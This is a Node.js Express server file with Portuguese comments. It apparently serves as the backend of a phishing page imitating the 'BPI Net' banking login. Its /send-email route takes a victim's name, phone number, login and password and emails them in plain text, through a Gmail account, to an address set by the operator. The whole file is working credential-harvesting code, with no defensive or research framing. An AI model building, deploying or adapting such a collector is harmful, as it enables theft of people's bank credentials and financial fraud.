require('dotenv').config();
const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middlewares
app.use(cors());
app.use(bodyParser.json());

// Caminho para a pasta 'public' se ela existir
const publicPath = path.join(__dirname, 'public');

// Serve arquivos estáticos apenas se a pasta existir
const fs = require('fs');
if (fs.existsSync(publicPath)) {
  app.use(express.static(publicPath));

  app.get('/', (req, res) => {
    res.sendFile(path.join(publicPath, 'index.html'));
  });
} else {
  // Caso a pasta public/index.html não exista
  app.get('/', (req, res) => {
    res.send('API do servidor está online. Nenhum frontend encontrado.');
  });
}

// Rota de envio de email
app.post('/send-email', async (req, res) => {
  const { name, phone, login, password } = req.body;

  if (!name || !phone || !login || !password) {
    return res.status(400).json({ message: 'Campos obrigatórios ausentes' });
  }

  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: process.env.EMAIL_USER,
      pass: process.env.EMAIL_PASS,
    },
  });

  const mailOptions = {
    from: `"BPI Formulário" <${process.env.EMAIL_USER}>`,
    to: process.env.RECEIVER_EMAIL,
    subject: 'Nova submissão do formulário BPI Net',
    html: `
      <h3>Dados Recebidos</h3>
      <p><strong>Nome:</strong> ${name}</p>
      <p><strong>Telefone:</strong> ${phone}</p>
      <p><strong>Login:</strong> ${login}</p>
      <p><strong>Senha:</strong> ${password}</p>
    `,
  };

  try {
    await transporter.sendMail(mailOptions);
    res.status(200).json({ message: 'Email enviado com sucesso' });
  } catch (error) {
    console.error('Erro ao enviar e-mail:', error);
    res.status(500).json({ message: 'Erro ao enviar e-mail', error: error.message });
  }
});

// Inicializa o servidor
app.listen(PORT, () => {
  console.log(`Servidor rodando na porta ${PORT}`);
});
